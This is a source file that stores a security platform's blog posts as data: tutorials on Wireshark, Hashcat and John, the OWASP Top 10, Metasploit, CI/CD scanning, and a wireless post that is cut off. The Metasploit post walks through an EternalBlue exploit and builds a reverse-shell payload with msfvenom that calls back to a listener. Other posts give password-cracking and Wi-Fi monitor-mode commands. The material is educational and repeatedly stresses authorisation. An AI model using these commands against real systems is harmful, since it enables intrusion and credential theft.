/**
 * Blog content — the single source of truth.
 *
 * This data used to exist in three places: here (inside the client component),
 * src/lib/blog-posts.ts, and again inside BlogSection.tsx. Three copies drifted
 * exactly as three copies do. In one sweep that produced: two posts sharing a
 * title, four posts with no metadata at all (so they rendered with the blog
 * index's title and shipped no schema), and every post overstating its read
 * time by between five and eighteen times.
 *
 * So the data lives here, once, with no "use client" and no JSX, and everything
 * else derives from it.
 */

export interface BlogPost {
  slug: string;
  title: string;
  category: string;
  date: string;
  author: string;
  excerpt: string;
  content: string;
  tags: string[];
}

/**
 * Minutes to read, computed from the post rather than asserted next to it.
 *
 * The hand-written numbers claimed 9 to 18 minutes for posts of 228 to 500
 * words — a "18 min read" label on roughly one minute of text. 225 words per
 * minute is the usual reading rate for technical prose; code blocks are
 * scanned rather than read, so they are counted at a third.
 */
export function estimateReadTime(content: string): number {
  const code = (content.match(/```[\s\S]*?```/g) || []).join(" ");
  const prose = content.replace(/```[\s\S]*?```/g, " ");
  const words = prose.split(/\s+/).filter(Boolean).length;
  const codeWords = code.split(/\s+/).filter(Boolean).length;
  return Math.max(1, Math.round((words + codeWords / 3) / 225));
}

export const BLOG_POSTS: Record<string, BlogPost> = {
  "mastering-wireshark": {
    slug: "mastering-wireshark",
    title: "Mastering Wireshark: Network Traffic Analysis Deep Dive",
    category: "Tools",
    date: "2026-01-15",
    author: "Semih Kilic",
    excerpt: "Capture filters delete, display filters hide — confusing them costs you evidence. Following streams, reading traffic for beaconing and tunnelling, and scripting it all with tshark.",
    tags: ["wireshark", "network-analysis", "packet-capture", "traffic-analysis"],
    content: `
## The mindset that makes Wireshark useful

Open Wireshark on a busy interface and you get thousands of packets a second — a firehose that tells you nothing until you know what you are looking for. The people who find Wireshark indispensable and the people who find it overwhelming are looking at the same tool; the difference is entirely one of method. This guide is about the method: capture less, filter hard, and know what normal looks like before you go hunting for abnormal.

Almost everything below also assumes the traffic is yours to look at. Packet capture on a network you do not own or administer can break wiretapping law, and "I was just curious" is not a defence. On your own network, in a lab, or with written authorisation, it is one of the most powerful diagnostic and forensic tools there is.

## Two kinds of filter, and the costly mistake of confusing them

Wireshark has two filter systems that look similar and do completely different jobs. Getting them straight is the first real skill.

A **capture filter** decides what gets *recorded*. It runs before packets are saved, uses the low-level BPF syntax, and what it drops is gone forever. Use it to keep a capture manageable on a busy link:

\`\`\`
# Only web traffic
tcp port 80 or tcp port 443

# Only one subnet
net 192.168.1.0/24

# Only DNS
udp port 53
\`\`\`

A **display filter** decides what you *see* in a capture you already have. It uses Wireshark's own richer syntax, and it hides rather than deletes — clear it and every packet is back:

\`\`\`
# HTTP POSTs — a place data leaves the network
http.request.method == "POST"

# DNS lookups to throwaway TLDs
dns.qry.name contains ".xyz" or dns.qry.name contains ".top"

# TLS to a non-standard port
tls && tcp.port != 443
\`\`\`

The mistake that costs you evidence: using a *capture* filter when you should have used a *display* filter. If you capture only port 443 and later realise the interesting activity was on port 8443, that traffic was never written and cannot be recovered. On anything you might need to investigate afterwards, capture broadly and filter the display narrowly. Capture filters are for taming volume on a link too busy to record whole; display filters are for the actual analysis.

## Following the conversation, not the packet

A single packet rarely tells a story; the exchange does. Wireshark's most useful everyday feature is **Follow TCP Stream** (right-click a packet → Follow → TCP Stream), which reassembles both directions of a connection into the actual back-and-forth — the HTTP request and its response, the commands and replies of a plaintext protocol, laid out in order. This is where you stop reading hex and start reading what happened.

Two menus turn a capture into an overview:

- **Statistics → Conversations** lists every pair of hosts talking, with byte and packet counts. It is how you spot the one internal host sending far more data outbound than any other.
- **Statistics → Protocol Hierarchy** breaks the capture down by protocol, so an unexpected sliver of something — IRC on a corporate network, an odd amount of ICMP — jumps out against the normal mix.

## Reading traffic for signs of trouble

Once you can filter and follow, the forensic questions become approachable. A few patterns worth knowing by sight:

**Beaconing.** Command-and-control malware tends to phone home on a regular cadence — a connection every 60 seconds, say, whether or not there is anything to do. In *Conversations*, that shows as a host pair with a steady, metronomic packet rhythm rather than the bursty pattern of human activity. Regularity is the tell.

**DNS tunnelling.** DNS is allowed out of almost every network, which makes it a favourite covert channel. The signatures are unusually long query names, a high volume of \`TXT\` lookups, and a flood of subdomains under one parent domain — data smuggled out one query at a time. A display filter on \`dns\` plus a glance at query lengths surfaces it.

**Data exfiltration.** Large outbound transfers at hours when nobody is working, encrypted connections to non-standard ports, or big HTTP \`POST\` bodies to a domain no one recognises. None is proof on its own; together, and against a baseline of what this network normally does, they are a lead.

The common thread is that every one of these is defined *relative to normal*. You cannot recognise abnormal beaconing without knowing this network's usual rhythm, or a suspicious destination without knowing the usual ones. Which is why the single most valuable thing you can do with Wireshark is study known-good traffic first.

## tshark: Wireshark without the window

The GUI is for exploring; \`tshark\`, its command-line sibling, is for repeating and automating. Anything you do once by hand, tshark lets you script over many captures:

\`\`\`bash
# Every HTTP host and path requested in a capture
tshark -r capture.pcap -Y "http.request" \\
  -T fields -e http.host -e http.request.uri

# Talkers, busiest first — the CLI version of the Conversations view
tshark -r capture.pcap -T fields -e ip.src | sort | uniq -c | sort -rn | head -20

# Carve one TCP stream out into its own file for closer study
tshark -r capture.pcap -Y "tcp.stream eq 5" -w stream5.pcap
\`\`\`

\`-Y\` takes the same display-filter syntax as the GUI, and \`-T fields -e …\` prints named fields as columns you can pipe into \`sort\`, \`awk\` or a script. This is how you go from analysing one capture to processing a directory of them the same way every time — the foundation of any automated triage pipeline.

## Working habits that save you later

- **Capture broad, filter narrow.** Record more than you think you need; a display filter can always narrow it, a capture filter cannot un-drop a packet.
- **Use a ring buffer for long captures.** \`-b filesize:\` / \`-b files:\` (or the GUI's multiple-file options) roll over old files so continuous monitoring does not fill the disk.
- **Treat captures as sensitive.** A pcap can contain credentials, tokens and personal data in the clear. Encrypt it at rest and delete it when the work is done — it is exactly the kind of file that turns a capture session into a breach.
- **Timestamp everything.** In incident response the sequence and timing of packets is often the whole finding; note the capture's time base.
- **Baseline first.** Capture a known-good period and learn its shape. Every anomaly you will ever find is defined against that.

## Where a hosted scanner fits — and where it doesn't

Wireshark reads traffic that reaches the machine it runs on, which means capture is inherently local: to see a network's packets you need to be on that network, and no remote service can sniff air or wire it cannot touch. That part stays on your own machine. What a platform like CyberSec Pro complements is the *active* side of an assessment — the scanning, enumeration and exploitation tools that generate traffic and probe services, run server-side in a dedicated container with their output streamed back. A common workflow pairs the two: run an authorised scan from the platform, capture the resulting traffic locally in Wireshark, and use the packet view to confirm exactly what the target did in response. The scanner tells you what is exposed; the capture tells you what actually happened on the wire.
    `,
  },
  "hashcat-vs-john": {
    slug: "hashcat-vs-john",
    title: "Hashcat vs John the Ripper: Password Cracking Compared",
    category: "Tools",
    date: "2026-01-12",
    author: "Semih Kilic",
    excerpt: "The one question that decides between them, why the GPU advantage vanishes on bcrypt, and why even Hashcat users reach for John's *2john helpers. They are complements, not rivals.",
    tags: ["hashcat", "john-the-ripper", "password-cracking", "GPU"],
    content: `
## Two tools, and the question that actually decides between them

Hashcat and John the Ripper both crack password hashes, both are free, and both are on every serious tester's machine. The lazy framing is "Hashcat is the GPU one, John is the CPU one" — true as far as it goes, and useless when you are staring at a hash file deciding what to run. The question that decides it is simpler: **do you already know what the hash is, and is it a common format?** If yes, Hashcat's speed wins. If no — an odd format, a file John recognises and you don't, a box with no GPU — John's versatility wins. Most professionals keep both for exactly this reason, and this guide is about knowing which to reach for when.

## Where the speed difference comes from — and where it evaporates

Hashcat is built to run on the GPU, and on fast hash types the gap over CPU cracking is enormous — a good graphics card computes MD5 or NTLM guesses hundreds of times faster than a CPU can. Published benchmarks put a high-end GPU in the hundreds of billions of NTLM guesses per second; a CPU is in the low billions at best. For a large list of fast hashes, that ratio is the difference between an afternoon and a month.

But the gap is a property of the *hash type*, not the tools, and it collapses on slow hashes:

| Hash type | Character | GPU advantage |
|---|---|---|
| MD5, NTLM | fast | very large — hundreds of × |
| SHA-256 | fast | large |
| bcrypt | slow by design | small — often only a few × |

bcrypt is the honest example. Its whole purpose is to resist fast guessing, and it resists a GPU nearly as well as a CPU — so Hashcat's headline advantage nearly vanishes, and the two tools finish a bcrypt job in the same order of magnitude of time. Treat any single benchmark number as an order-of-magnitude guide, not a spec: it shifts with the GPU, the driver, the hashcat version and the exact hash. Run \`hashcat -b\` on your own hardware for a figure you can trust.

The real lesson is not "Hashcat is 200× faster". It is that the *algorithm* decides whether speed even matters — and when the target uses bcrypt, your choice of tool matters far less than your choice of wordlist and rules.

## What each tool is actually better at

**Hashcat's strengths** are raw throughput on common hashes and a mask-attack engine that is a pleasure to use once \`?l?u?d?s\` is muscle memory. If you have a GPU, a large list of a known common hash type, and want maximum speed, this is the tool.

**John the Ripper's strengths** are the ones that show up when the situation is awkward:

- **It identifies hashes for you.** Point John at a file and it will often just recognise the format and start, where Hashcat needs the correct \`-m\` first. On an unfamiliar hash, John is the faster path to a running crack.
- **It handles exotic formats.** The \`*2john\` helper family — \`zip2john\`, \`ssh2john\`, \`keepass2john\`, \`pdf2john\` and dozens more — extracts a crackable hash from an encrypted archive, an SSH key, a password manager database or a PDF. This is often the *only* practical way to get at those, and it is John's territory.
- **"Single crack" mode** uses the account's own metadata — username, full name, GECOS fields — as candidate passwords, which catches the person who set their password to a variation of their own name. Nothing in Hashcat does this as naturally.
- **It needs no GPU.** On a server, a VM, or any box without a graphics card, John just works.

## Side by side

\`\`\`bash
# Hashcat: NTLM list, dictionary + the best64 rules. The bread-and-butter run.
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/best64.rule

# Hashcat: a shaped brute force for 8-char "Aaaaa11!" passwords.
hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?d?d?s

# John: crack a Linux shadow file, letting it detect the format.
john --wordlist=rockyou.txt --rules /etc/shadow

# John: turn an encrypted ZIP into a hash, then crack it — the thing Hashcat can't do alone.
zip2john secret.zip > zip.hash
john --wordlist=rockyou.txt zip.hash
\`\`\`

That last pair is the clearest illustration of the split: Hashcat has no equivalent of \`zip2john\`, so even a die-hard Hashcat user reaches for John to *extract* the hash — and may then feed it back to Hashcat to crack it fast. The tools are complementary far more than they are rivals.

## A workflow that uses both

1. **Identify.** If you don't know the format, let John try first, or run \`hashcat --identify\`.
2. **Extract, if needed.** Encrypted archive, SSH key, PDF, KeePass? That is a \`*2john\` job.
3. **Crack fast, if it's a common hash and you have a GPU.** Hand the hash to Hashcat with a dictionary and \`best64\`.
4. **Fall back to John** for anything exotic, or when there is no GPU to be had.
5. **Spend effort on guesses, not tools.** On a slow hash, neither tool will brute-force its way through — a good wordlist and rule set is what cracks it, in either tool.

## The rule that applies to both

Cracking a hash you were not authorised in writing to test is unlawful, and the plaintexts you recover — in any tool — are among the most sensitive data an engagement produces. Report the findings, store the results encrypted, and delete them when the work is done. Practise on your own hashes, deliberately vulnerable VMs, or sanctioned CTF material until the workflow above is second nature.

## Running either without local setup

Both tools install cleanly, and Hashcat in particular rewards real GPU hardware you control. If you would rather not provision a cracking box, CyberSec Pro runs Hashcat from a browser — hashes and options on a form, the command shown before it runs, output streamed back, the job isolated in its own container and the hashes treated as the sensitive material they are. For the format-extraction and detection work, John on a local machine remains the natural companion. The decision is unchanged either way: known common hash and speed matters, reach for Hashcat; unknown or exotic format, reach for John; and when it's bcrypt, stop worrying about the tool and improve your wordlist.
    `,
  },
  "owasp-top-10-2026": {
    slug: "owasp-top-10-2026",
    title: "OWASP Top 10 in 2026: What's Changed",
    category: "Security",
    date: "2026-01-08",
    author: "Semih Kilic",
    excerpt: "The 2021 list is still the official one; there is no finalised 2026 ranking. Here is what counts today, where the next edition is genuinely heading (API, supply chain, AI), and why scanners are weakest on the number-one risk.",
    tags: ["OWASP", "web-security", "top-10", "application-security"],
    content: `
## First, what the OWASP Top 10 actually is — and is not

The OWASP Top 10 is a periodically updated awareness document that ranks the most critical categories of web application security risk. It is not a standard, not a checklist you certify against, and not updated every year. The last finalised edition is **2021**. A revision has been in progress, with community data collection and a draft under discussion, and the security community has been debating what will move — but until OWASP publishes and finalises it, there is no official "2026" list, and anyone presenting one as settled fact is guessing with confidence.

So treat this as what it is: the current official Top 10 is 2021, and the shifts below are the well-supported *directions* the next edition is widely expected to reflect, driven by how applications are actually built now. Where something is anticipated rather than published, it says so.

## The 2021 list, which is still the one that counts

If you are testing an application today, this is the framework to test against, because it is the one that is finalised:

1. **Broken Access Control** — the number-one risk in 2021, and the one that shows up most in real engagements.
2. **Cryptographic Failures** — weak or missing encryption of data in transit and at rest.
3. **Injection** — SQL, command, LDAP; still present, now including cross-site scripting as a form of injection.
4. **Insecure Design** — a category about flaws in the design itself, not the implementation.
5. **Security Misconfiguration** — default credentials, verbose errors, unnecessary features left enabled.
6. **Vulnerable and Outdated Components** — running dependencies with known CVEs.
7. **Identification and Authentication Failures** — weak session management, credential stuffing exposure.
8. **Software and Data Integrity Failures** — trusting code or data from untrusted sources, including insecure deserialization.
9. **Security Logging and Monitoring Failures** — not seeing the attack while it happens.
10. **Server-Side Request Forgery (SSRF)** — added in 2021, reflecting how often modern apps fetch URLs on the server's behalf.

Broken Access Control sitting at the top is the single most useful thing in the list. It is not a subtle cryptographic flaw; it is "user A can read user B's data by changing an ID in the URL", and it is everywhere. If you test one thing thoroughly, test authorisation on every object your app exposes.

## Where the next edition is widely expected to move

These are the pressures the community has been responding to. Read them as "what to start paying attention to", not as a published ranking.

**Broken access control is not going anywhere.** Every signal points to it staying at or near the top. The move to APIs and microservices has multiplied the number of places an authorisation check can be missing, not reduced it.

**API-specific risks are the clearest growth area.** Applications are now mostly API calls behind a thin client, and the failure modes have their own shape — **Broken Object Level Authorization** (the API version of "change the ID, read someone else's record"), excessive data returned in responses that the client then filters, and missing rate limits. OWASP maintains a separate **API Security Top 10** precisely because this deserved its own document; anyone testing a modern app should read it alongside the main list.

**Supply-chain risk has graduated from a subcategory to a headline.** "Vulnerable and Outdated Components" was always on the list, but dependency-confusion attacks, compromised build pipelines and malicious packages pushed to public registries have made the software supply chain a first-class target. A Software Bill of Materials (SBOM) and pinned, verified dependencies are now baseline hygiene, not advanced practice.

**AI-integrated applications are the genuinely new surface.** Applications that embed large language models introduce failure modes that did not exist when the 2021 list was written — **prompt injection** (crafting input that overrides the model's instructions), training-data poisoning, and leaking sensitive context through the model. OWASP addressed this with a dedicated **Top 10 for LLM Applications** rather than folding it into the web list, which tells you both that it is real and that it is treated as its own domain. If your app has an LLM in it, that separate list is the one to test against.

## How to actually test against any of this

The value of the Top 10 is as a coverage map: it tells you what *kinds* of flaw to look for, and you use tools to look. Against a real target that means combining automated breadth with manual depth:

- **Broad web scanning** — OWASP ZAP for an active crawl-and-attack pass across the app, and Nuclei for fast, template-based checks of known issues. These catch misconfiguration, outdated components and many injection points quickly.
- **Injection testing** — sqlmap for SQL injection specifically, once you have found a candidate parameter (the companion sqlmap guide covers this in depth).
- **Server and configuration checks** — Nikto for web-server misconfiguration and dangerous defaults.
- **The manual half** — access-control testing is mostly manual, because only you know that user A should not see user B's order. No scanner reliably finds "change the ID and you get someone else's data"; you find it by trying.

That last point is the one to internalise. Automated tools are excellent at the categories that have a signature — outdated components, misconfigurations, reflected injection. They are weak exactly where the number-one risk lives, because broken access control depends on knowing the application's intended rules. Scanners give you breadth; a human testing authorisation on every object gives you the finding that matters most.

## The honest way to use this list

Test against the 2021 edition, because it is the finalised one. Watch the API, supply-chain and AI directions, because that is where the next edition is heading and where modern apps are actually breaking. And read the two companion lists — API Security Top 10 and the LLM Top 10 — if your application is an API or embeds a model, because the main web list was never designed to cover those in depth. When OWASP finalises the next Top 10, revisit; until then, anyone quoting a definitive 2026 ranking is ahead of the source.

## Testing your OWASP coverage with CyberSec Pro

CyberSec Pro runs the tools above — OWASP ZAP, Nuclei, Nikto and sqlmap among the 88 in the catalogue — from a browser, on a generated form, with the command shown before it runs and the output streamed back. That covers the breadth half well: the categories a scanner can detect, run consistently and repeatably, with results you can diff between assessments. It does not replace the manual access-control testing that the top risk demands, and no tool honestly claims to. Use the automated scans to clear the ground quickly, and spend your own time where the scanner is blind — on whether your application actually enforces who is allowed to see what.
    `,
  },
  "metasploit-zero-to-exploit": {
    slug: "metasploit-zero-to-exploit",
    title: "Getting Started with Metasploit: Your First Exploit",
    category: "Tutorials",
    date: "2026-01-05",
    author: "Semih Kilic",
    excerpt: "From an empty msfconsole to a live session: the five module types, why reverse payloads call home to your LHOST, building standalone payloads with msfvenom, and why you check before you exploit.",
    tags: ["metasploit", "exploitation", "penetration-testing", "msfvenom"],
    content: `
## What Metasploit actually is

Newcomers meet Metasploit as "the tool that runs exploits", which is true and also the least interesting thing about it. What makes it the framework every other pentest tool measures itself against is that it turns four separate jobs — knowing which exploit fits a target, delivering it, catching the connection that comes back, and doing something useful with that connection — into four kinds of interchangeable module that snap together. Learn how the pieces fit and you can reason about any of the thousands of modules you have never seen, instead of memorising commands.

This guide takes you from an empty \`msfconsole\` to a live session on a lab target. What you do *with* that session — privilege escalation, credential theft, pivoting to the next host — is the subject of the companion guide on Meterpreter and post-exploitation.

## The five module types

Everything in the framework is one of these, and the whole workflow is a matter of choosing one of each that you need:

- **Exploits** take advantage of a specific vulnerability. \`exploit/windows/smb/ms17_010_eternalblue\` is one flaw, in one protocol, on one platform.
- **Payloads** are the code that runs *after* the exploit lands — a shell, or the far more capable Meterpreter.
- **Auxiliary** modules do everything that is not exploitation: port and version scanning, fuzzing, brute-forcing, protocol enumeration. You will often use an auxiliary scanner before any exploit.
- **Post** modules run inside a session you already have, to escalate, harvest or pivot.
- **Encoders** and **nops** reshape a payload's bytes. Their historical job was evading signature-based antivirus; against a modern EDR they rarely help on their own, and it is worth having that expectation from the start.

The important idea is that exploit and payload are chosen *separately*. The same EternalBlue exploit can deliver a simple command shell, a Meterpreter session, or a payload that just adds a user — because the exploit's job ends the moment it gets code running, and the payload's job begins there.

## Reverse versus bind: which way the connection goes

Before the first exploit, one distinction saves a lot of confusion. A payload named \`reverse_tcp\` makes the *target* connect back to *you*; a \`bind_tcp\` payload opens a port on the target and waits for you to connect *in*. Reverse is the default for a reason: outbound connections usually survive a firewall that blocks inbound ones. This is why a reverse payload needs \`LHOST\` (your address, for the target to reach) while a bind payload needs only \`RHOST\`. Getting these backwards is the single most common reason a beginner's exploit "succeeds" but no session appears.

## Your first exploit, step by step

\`\`\`bash
# 1. Start the console.
msfconsole

# 2. Find something that fits the target.
msf6 > search type:exploit platform:windows smb

# 3. Select it. The prompt changes to show the active module.
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 4. See what it needs.
msf6 exploit(ms17_010_eternalblue) > show options

# 5. Point it at the target.
msf6 exploit(...) > set RHOSTS 192.168.56.101

# 6. Choose a payload, and tell it where to call home.
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.56.1

# 7. Sanity-check before firing.
msf6 exploit(...) > check
msf6 exploit(...) > exploit
\`\`\`

Two of these steps are the ones people skip and then regret. \`show options\` lists every required field — miss one and the exploit fails with a message that does not always name the missing field. And \`check\`, which many exploits support, asks the target whether it is likely vulnerable *without* firing the exploit. On a fragile production system, a failed EternalBlue attempt can blue-screen the host; \`check\` first is the difference between a finding and an outage you have to explain.

## Reading what comes back

A successful run ends with a line like:

\`\`\`
[*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.101:49512)
\`\`\`

If you instead see the exploit complete with no session, the usual causes are, in order: the payload could not reach \`LHOST\` (wrong address, or a firewall between you and the target), the target was patched and the exploit simply failed, or you chose a payload architecture that does not match the target — a \`x64\` payload against a 32-bit process, for instance. \`set PAYLOAD\` mismatches are quiet failures, so when in doubt, start with the generic \`windows/meterpreter/reverse_tcp\` and let the framework sort the architecture out.

You do not have to hold the exploit open. \`background\` (or Ctrl+Z) drops the session into the background and returns you to the console, where \`sessions -l\` lists them and \`sessions -i 1\` resumes one.

## Payloads you build ahead of time: msfvenom

Not every payload is delivered by an exploit. Often you need a standalone file — something to drop on a target you already have limited access to, or to use in a phishing exercise that is inside your engagement's scope. \`msfvenom\` builds those:

\`\`\`bash
# A Windows executable that calls back to you.
msfvenom -p windows/x64/meterpreter/reverse_tcp \\
  LHOST=10.0.0.5 LPORT=4444 -f exe -o payload.exe
\`\`\`

Run it and the tool reports what it produced:

\`\`\`
Payload size: 509 bytes
Final size of exe file: 7680 bytes
Saved as: payload.exe
\`\`\`

The \`-f\` format is the whole point of msfvenom: the same payload can come out as an \`exe\`, a \`dll\`, an \`elf\` for Linux, a \`.jar\`, an \`aspx\` web shell, raw shellcode, and around forty other formats. You pick the one that fits how you will deliver it. A payload built this way needs something on your side to catch the connection — which is the next piece.

## The multi/handler: catching what you sent

When the payload is delivered by msfvenom rather than by a live exploit, you run a listener yourself:

\`\`\`bash
msf6 > use exploit/multi/handler
msf6 exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(handler) > set LHOST 10.0.0.5
msf6 exploit(handler) > set LPORT 4444
msf6 exploit(handler) > exploit -j
\`\`\`

The payload in the handler must match the payload you built with msfvenom, down to the architecture and the \`LPORT\` — the handler is the other end of the same phone line. \`-j\` runs it as a background job so you can keep working while it waits for the call.

## Practise legally, from the first command

Everything above is illegal against a system you do not own or have written permission to test, and "I was learning" is not a defence. Build a lab instead — it is the fastest way to learn and the only safe one:

- **Metasploitable 2/3**, VMs the Metasploit project maintains specifically as legal targets.
- **VirtualBox or VMware** on your own machine, with a host-only network so nothing you launch can leave it.
- A **HackTheBox** or **TryHackMe** subscription, which give you sanctioned targets and a guided path.

EternalBlue against your own Metasploitable VM teaches you the same workflow you will use on a real engagement, with none of the legal exposure.

## Running Metasploit without maintaining it

Keeping a current Metasploit install, a payload toolkit and a lab network on your own machine is real work, and doing it is a legitimate way to learn the tool deeply. If you would rather not, CyberSec Pro runs Metasploit's modules from a browser — you choose the module and set its options on a form, see the command before it runs, and watch the output stream back. The job runs server-side in a dedicated container, one process per job, and any credentials you provide are held in memory for that job alone.

Either way, the mental model is what carries over: exploit and payload are separate choices, reverse connections come back to your \`LHOST\`, and you \`check\` before you \`exploit\`. Once you have a session open, the companion guide picks up from there.
    `,
  },
  "ci-cd-pentest-automation": {
    slug: "ci-cd-pentest-automation",
    title: "Automating Penetration Tests with CI/CD",
    category: "DevSecOps",
    date: "2026-01-03",
    author: "Semih Kilic",
    excerpt: "The real CyberSec Pro API contract for a GitHub Actions pipeline — start a scan, poll it, gate the build on severity — and why a noisy gate is worse than no gate.",
    tags: ["CI/CD", "automation", "DevSecOps", "GitHub-Actions"],
    content: `
## The case for automating the boring half

Manual penetration testing is where the real findings come from — the access-control flaw a human notices, the business-logic abuse no scanner has a signature for. But a lot of security work is not that. Checking that no dependency has a known CVE, that a scan of the staging site still comes back clean, that no secret got committed — this is repetitive, mechanical, and exactly the kind of thing that gets skipped under deadline pressure precisely because it is repetitive. Automating it in the pipeline means it runs on every change whether anyone remembers or not, and it catches the regression in development, where a fix is cheap, rather than in production, where it is not.

The goal is not to replace the pentest. It is to let the pentester spend their time on the half that needs a human, by making the machine handle the half that does not.

## Where each check belongs in the pipeline

Security testing is not one step; different checks belong at different stages, because they need different things to be true.

- **Pre-commit / commit:** secret scanning and a dependency audit. These need only the source, run in seconds, and stop the two most common own-goals — a committed credential, a pulled-in package with a known CVE — before they land.
- **Build:** static analysis (SAST) and container image scanning. These need the code compiled and the image built, but not deployed.
- **Post-deploy to staging:** dynamic analysis (DAST) against the running application. This is the stage that needs a live URL, and it is where a tool that actually exercises the app — like a CyberSec Pro scan — fits.
- **Scheduled, out of band:** a fuller scan weekly, independent of any single change, to catch the slow drift a per-commit scan is too narrow to see.

The mistake is trying to do everything at every stage. A DAST scan on every commit is too slow and needs a deployment that may not exist yet; a secret scan post-deploy is too late. Match the check to the stage that can actually support it.

## Triggering a scan from GitHub Actions

Here is the real integration against the CyberSec Pro API. Note the exact shape — the endpoint, the authentication header, and the request body are what the API actually accepts:

\`\`\`yaml
# .github/workflows/security-scan.yml
name: Security Scan
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  dast:
    runs-on: ubuntu-latest
    steps:
      - name: Start a scan of the staging deployment
        id: scan
        run: |
          RESPONSE=$(curl -sS -X POST https://api.cyber-sec-pro.com/api/v1/scans \\
            -H "X-API-Key: \${{ secrets.CYBERSEC_API_KEY }}" \\
            -H "Content-Type: application/json" \\
            -d '{
              "tool": "nuclei",
              "target": "https://staging.example.com",
              "parameters": { "severity": "critical,high" }
            }')
          echo "scan_id=$(echo "$RESPONSE" | jq -r .scan_id)" >> "$GITHUB_OUTPUT"
\`\`\`

Three things are worth calling out because they are the parts people get wrong. The path is \`/api/v1/scans\` — the \`/api\` prefix is part of it. Authentication is an API key in the \`X-API-Key\` header (CyberSec Pro keys start with \`csp_\`; the same key also works as \`Authorization: Bearer csp_...\`), not a user password. And the body's fields are \`tool\`, \`target\` and \`parameters\` — you pass the tool by name or as \`tool_id\`, and \`parameters\` is the same options object the tool's form builds in the dashboard.

A successful call returns \`201\` with a body like:

\`\`\`json
{ "success": true, "scan_id": "3f2a…", "status": "running", "engine": "rust-axum" }
\`\`\`

That \`scan_id\` is what you poll.

## Waiting for the result and acting on it

Starting a scan is asynchronous — the call returns immediately with a \`scan_id\`, and the scan runs server-side. A useful pipeline waits for it to finish and then decides whether to fail the build:

\`\`\`yaml
      - name: Wait for the scan and gate on severity
        run: |
          SCAN_ID="\${{ steps.scan.outputs.scan_id }}"
          for i in $(seq 1 60); do
            RESULT=$(curl -sS https://api.cyber-sec-pro.com/api/v1/scans/$SCAN_ID \\
              -H "X-API-Key: \${{ secrets.CYBERSEC_API_KEY }}")
            STATUS=$(echo "$RESULT" | jq -r '.scan.status')
            [ "$STATUS" = "completed" ] && break
            [ "$STATUS" = "failed" ] && { echo "scan failed"; exit 1; }
            sleep 10
          done

          CRIT=$(echo "$RESULT" | jq -r '.scan.findings_summary.critical // 0')
          HIGH=$(echo "$RESULT" | jq -r '.scan.findings_summary.high // 0')
          echo "Critical: $CRIT  High: $HIGH"
          if [ "$CRIT" -gt 0 ]; then
            echo "::error::Critical findings — failing the build."
            exit 1
          fi
\`\`\`

\`GET /api/v1/scans/{scan_id}\` returns the scan with its \`status\` and, once complete, a \`findings_summary\` broken down by severity — the same structure the dashboard shows. Polling it until \`completed\` and reading those counts is the whole mechanism.

## The gate is a policy decision, not a technical one

The most important line in that script is the one that decides what fails the build, and it is a judgement call, not a default.

- **Gate on Critical, and maybe High.** These are the findings worth stopping a deploy for.
- **Never gate on informational or low findings.** A pipeline that fails the build over a missing header teaches developers to ignore the security step — and once they are routing around it, it protects nothing. A noisy gate is worse than no gate.
- **Report everything, block on little.** Send the full result to a dashboard or a ticket queue so nothing is lost, but let only genuinely serious findings stop the line.

The failure mode of DevSecOps is not too little scanning; it is scanning that cries wolf until everyone stops listening. Tune the gate so that a red build always means something a developer should actually stop and fix.

## Start small, then widen

You do not roll all of this out at once. The order that works:

1. **Secret scanning** in pre-commit. Highest value, lowest friction, catches the worst mistakes.
2. **Dependency audit** in CI. Nearly free, and "Vulnerable and Outdated Components" is a standing OWASP risk.
3. **A DAST scan against staging**, gated on Critical only, once the first two are trusted.
4. **A scheduled weekly full scan**, independent of commits, once the per-commit scan is stable.

Each step earns trust before the next is added. A pipeline that starts by blocking every merge on a hundred low-severity findings gets disabled within a week; one that starts by quietly catching committed secrets earns the room to grow.

## Doing it with CyberSec Pro

The API above is real and is how the automation works: issue an API key in your account settings, store it as a CI secret, and the same \`POST /api/v1/scans\` you saw drives every stage. Because the scan runs server-side in a dedicated container, your CI runner does not need the tools installed — it just makes an HTTPS call and reads the result — and the findings land in the same dashboard as your manual scans, so the pipeline's output and a tester's output live in one place. Automate the mechanical half here; keep the human on the half that needs judgement.
    `,
  },
  "wireless-security-assessment": {
    slug: "wireless-security-assessment",
    title: "Wireless Security Assessment Best Practices",
    category: "Wireless",
    date: "2025-12-15",
    author: "Semih Kilic",
    excerpt: "The card that matters more than any tool, why WPA2 falls to an offline crack while WPA3 resists it, the PMKID attack that needs no client, and where the deauth ethics line sits.",
    tags: ["wireless", "WiFi", "aircrack-ng", "wifite", "bettercap"],
    content: `
## Why Wi-Fi is a different kind of target

Every other assessment in this series assumes you can reach the target over a network. Wi-Fi is the network, and that changes the game: the traffic is in the air, anyone in range can see the frames, and "in range" for a directional antenna is a lot further than the car park. You are not looking for an open port; you are looking at whether the encryption protecting that air is sound, whether the authentication can be captured and cracked offline, and whether a client can be tricked into connecting to something you control.

This is legitimate, necessary work on networks you own or are contracted to test — and it is a criminal offence on any other. Wireless makes that line easy to cross by accident, because your card will happily capture your neighbour's traffic along with your target's. The whole discipline below assumes written authorisation and a scope that names the SSIDs you may touch.

## The one piece of hardware that matters

Before any tool, you need a wireless adapter that supports **monitor mode** and **packet injection**. Most built-in laptop cards do neither well. Monitor mode lets the card report every frame in the air rather than only those addressed to it; injection lets it transmit crafted frames, which several attacks below require. Adapters built on Atheros or Ralink chipsets (the common Alfa cards, for instance) are the usual choice precisely because their drivers support both. Without the right card, half of what follows silently does nothing, and that is the most common reason a beginner's wireless assessment produces no results.

## Getting into monitor mode

The aircrack-ng suite is the foundation, and the first step is putting the interface into monitor mode:

\`\`\`bash
# Kill processes that will fight you for the interface.
sudo airmon-ng check kill

# Put wlan0 into monitor mode — it becomes wlan0mon.
sudo airmon-ng start wlan0

# See every network and client in range.
sudo airodump-ng wlan0mon
\`\`\`

That last command is your radar. It lists access points with their BSSID (the AP's MAC), channel, encryption type, and signal strength, and below them the clients currently associated. Read the encryption column first: it tells you whether you are looking at WPA2, WPA3, or — still, in the wild — WEP, and that decides everything about the attack that follows.

## The WPA2 attack, and what it actually captures

